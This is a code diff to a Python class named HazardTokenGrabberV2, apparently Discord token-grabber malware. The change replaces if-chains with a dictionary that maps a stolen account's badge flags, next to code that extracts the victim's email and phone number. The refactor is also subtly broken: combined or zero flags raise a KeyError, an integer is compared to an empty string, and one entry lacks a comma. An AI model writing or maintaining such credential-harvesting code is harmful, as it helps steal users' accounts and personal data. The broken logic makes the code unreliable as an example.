@@ -521,28 +521,21 @@ class HazardTokenGrabberV2(Functions):
 
             badges = ""
             flags = j['flags']
-            if (flags == 1):
-                badges += "Staff, "
-            if (flags == 2):
-                badges += "Partner, "
-            if (flags == 4):
-                badges += "Hypesquad Event, "
-            if (flags == 8):
-                badges += "Green Bughunter, "
-            if (flags == 64):
-                badges += "Hypesquad Bravery, "
-            if (flags == 128):
-                badges += "HypeSquad Brillance, "
-            if (flags == 256):
-                badges += "HypeSquad Balance, "
-            if (flags == 512):
-                badges += "Early Supporter, "
-            if (flags == 16384):
-                badges += "Gold BugHunter, "
-            if (flags == 131072):
-                badges += "Verified Bot Developer, "
-            if (badges == ""):
-                badges = "None"
+            flag_meanings = {
+                "1": "Staff, ",
+                "2": "Partner, ",
+                "4": "Hypesquad, ",
+                "8": "Green Bughunter, ",
+                "64": "Hypesquad Bravery, ",
+                "128": "Hypesquad Brilliance, ",
+                "256": "Hypesquad Balance, ",
+                "512": "Early Supporter, ",
+                "16384": "Gold BugHunter",
+                "131072": "Verified Bot Developer, "
+            }
+            
+            if flags != "":
+                badges += flag_meanings[str(flags)]
 
             email = j.get("email")
             phone = j.get("phone") if j.get("phone") else "No Phone Number attached"
